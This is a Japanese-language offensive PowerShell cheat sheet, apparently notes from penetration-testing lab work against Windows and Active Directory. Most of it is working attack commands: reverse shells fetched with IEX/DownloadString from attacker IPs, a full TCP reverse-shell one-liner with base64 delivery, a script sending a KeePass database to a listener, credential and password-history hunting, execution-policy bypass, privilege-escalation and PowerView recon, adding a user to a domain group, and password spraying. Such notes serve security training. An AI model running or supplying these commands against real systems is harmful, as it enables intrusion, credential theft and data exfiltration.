## 現在の実行環境がコマンドプロンプトかPowerShellかをチェック
```.ps1
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

## 攻撃者のマシンからリバースシェルのスクリプトをダウンロードして実行する
```.ps1
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c <attacker IP> -p 4444 -e powershell
```

## Kali上でPowershell用のリバースシェルを生成してbase64エンコードのまま送信後、デコード・実行させる

1. パワーシェルをKali上で起動
```
pwsh
```

2. Powershellのリバースシェル用コマンドをText変数に入れる
```.ps1
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

3. 
```.ps1
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```

4. エンコードする
```.ps1
$EncodedText =[Convert]::ToBase64String($Bytes)
```

5. base64エンコードした文字列をターミナルに出力する
```.ps1
$EncodedText
```

6. ターゲット上でエンコードしたPowershellのリバースシェルコマンドをデコードさせて実行する
```.ps1
powershell%20-enc%20<先ほどの出力された$EncodedTextの内容>
```

7. Windowsターゲット上で、C:\配下の全ファイルを列挙。このケースでは.kdbxの拡張子のファイルを列挙
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

8. Attackerマシンからpowercatを取得して実行し、リバースシェルを取る
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.243/powercat.ps1');powercat -c 192.168.45.243 -p 4444 -e cmd"
```

9. 単純なリバースシェルコマンドで、コマンドプロンプトから実行させると動くのを確認済み
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.243',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

10. Kali側でncを使ってデータをレシーブ状態にさせて、データをPowershell側から送信する。動作検証済み
```
$content = Get-Content 'Database.kdbx' -Raw
$socket = New-Object System.Net.Sockets.TcpClient('192.168.45.243', 9999)
$stream = $socket.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.Write($content)
$writer.Flush()
$writer.Close()
$socket.Close()
```

11. Windows環境のローカルユーザを列挙する
```
Get-LocalUser
```

12. paulがローカルのどのグループのメンバーであるかを確認する
```
net user paul
```

13. ホスト上の既存のグループを列挙する
```
Get-LocalGroup
```

14. adminteamというローカルグループのメンバーを確認する
```
Get-LocalGroupMember adminteam
```

15. インストールされているすべてのアプリケーションを列挙する
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

16. 実行中のアプリケーションを一覧表示する
```
Get-Process
```

17. 認証情報が置かれてそうなファイルをすべて列挙
```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

18. 過去に実行されたコマンドのリストを取得する
```
Get-History
```

19. PSReadlineモジュールからPowerShellの実行履歴を取得したファイルパスを出力する(PSReadlineというモジュールによってコマンド履歴が記録されるが、これはClear-Historyコマンドでは削除されない)
```
(Get-PSReadlineOption).HistorySavePath
```

19. passというキーワードで、windows上のイベントビューアから平文のパスワードがPowerShell経由で実行されていないか、スクリプトブロックログを検索する
```
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Message -match "pass" }
```

20. ターゲット上で、attacker端末からwinPEASをダウンロードして落としてくる
```
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

21. ターゲットのWindows上で動いているサービスのバイナリの名前、状態、パスを取得する。  
winRMやbindshellで行うと失敗するので、RDP等の対話型ログオンをする必要がある。
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

22. icaclsでバイナリに対応するアクセス権限とプリンシパルを表示する
```
icacls "C:\xampp\apache\bin\httpd.exe"
```
icaclsの権限は以下の通り  
MASK	PERMISSIONS  
F	Full access  
M	Modify access  
RX	Read and execute access  
R	Read-only access  
W	Write-only access  

23. mysqlサービスのスタートアップの種類を確認する
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

24. 自分の権限をすべて確認する。ここで**SeImpersonatePrivilege**の権限も確認できる。
```
whoami /priv
```

25. PowerShellのスクリプトブロックをバイパスする 
```
powershell -ep bypass
```

26. 現在のユーザが変更できるサービスを表示する(PowerUpインポート時のみ)
```
Get-ModifiableServiceFile
```

27. /rでシャットダウンの代わりに再起動、/tで0秒を指定。
```
shutdown /r /t 0
```

28. UnquotedServiceの脆弱性がありそうなサービスにリンクするバイナリのパスを表示する。
```
Get-UnquotedService
```

29. サービスの起動方法を確認する。
```
Get-Service -Name <サービス名> | Select-Object DisplayName, StartType
```

30. プロセス名に対応するバイナリファイルのパスのみを列挙する。この場合はNotepadのバイナリファイルを表示するが、Notepadを抜いてGet-Processだけにすれば、すべてのプロセスに紐づくバイナリファイルを列挙できる。
```
Get-Process notepad | Select-Object -ExpandProperty Path
```

## AD recon

1. ドメインのユーザを列挙する
```
net user /domain
```

2. ドメイン内のグループを列挙する
```
net group /domain
```

3. jeffadminのドメイン内での情報を確認する
```
net user jeffadmin /domain
```

4. ドメイン内にあるManagement Departmentグループのメンバーを列挙する。
```
net group "Management Department" /domain
```

5. .NETクラスにおけるSystem.DirectoryServices.ActiveDirectory名前空間のDomainクラスの、GetCurrentDomainメソッドを呼び出す。現在のユーザのドメインオブジェクトを返す。
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

6. DistinguishedNameを取得する
```
([adsi]'').distinguishedName
```

7. サービスアカウントの一つであるiis_serviceというユーザ名に対して、SPNの列挙を行う。
```
setspn -L iis_service
```

8. ドメインにstephanieユーザを追加する。
```
net group "Management Department" stephanie /add /domain
```

9. 現在ドメインにログインしているユーザのアカウント情報やロックアウトポリシーを確認する。  
パスワードの最小文字数などのポリシーも確認できる。
```
net accounts
```

## PowerView
1. インポートする
```
Import-Module .\PowerView.ps1
```

2. ドメインに関する基本情報を取得する
```
Get-netDomain
```

3. ドメイン内の全てのユーザのリストを取得する
```
Get-NetUser
```

4. 各ユーザの出力に対して、属性を指定してそれらも表示する。ユーザがパスワードを最後に変更したのはいつか、最後にログオンしたのはいつか、そしてCommon Nameの属性。
```
Get-NetUser | select cn,pwdlastset,lastlogon
```

5. ドメイン内のグループを列挙する。
```
Get-NetGroup | select cn
```

6. グループの列挙で見つけたグループのDistinguished Nameを取得する。
```
Get-NetGroup "Sales Department" | select member
```

7. ドメイン内のコンピュータオブジェクトを列挙する。
```
Get-NetComputer
```

8. 現在ログインしているユーザが、コンピュータに対してローカル管理者権限を持っているかをスキャンする
```
Find-LocalAdminAccess
```

9. ドメイン内のマシンに対して、現在ログインしているユーザが存在するかをチェックする。  
このコマンドの出力は、  
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurityハイブのSrvsvcSessionInfoレジストリキーが有効になっている必要があり、このキーへのアクセス許可が無いといけない。
```
Get-NetSession -ComputerName files04
```

10. 指定したユーザに適用されているACE(Access Control Entry)を列挙する。
```
Get-ObjectAcl -Identity stephanie
```

11. SecurityIdentifier(SID)を読める形式に変換する。
```
Convert-SidToName <SID>
```

12. Management DepartmentグループオブジェクトのAclを取得。  
-eq => ActiveDirectoryRightsのプロパティがGenericAllのもののみ表示するようにフィルタ  
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

13. ドメイン内のドメイン共有を検索する
```
Find-DomainShare
```

14. SIDをまとめてコンバート
```
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```

## Spray-Passwords.ps1  
パスワードスプレー攻撃をドメイン内で行うツール
  
1. Nexus123!のパスワードを使ってパスワードスプレー。-Adminで管理者アカウントのテストも行う。
```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```